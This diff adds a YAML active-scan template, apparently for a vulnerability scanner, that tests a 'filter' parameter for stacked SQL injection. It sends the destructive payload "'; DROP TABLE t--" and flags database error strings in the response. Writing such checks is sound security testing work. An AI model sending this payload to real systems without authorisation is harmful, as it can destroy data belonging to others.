@@ -1,0 +1,25 @@
+id: sqli3-stacked-005
+name: 'Stacked query in filter'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via filter'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      filter:
+        - '''; DROP TABLE t--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
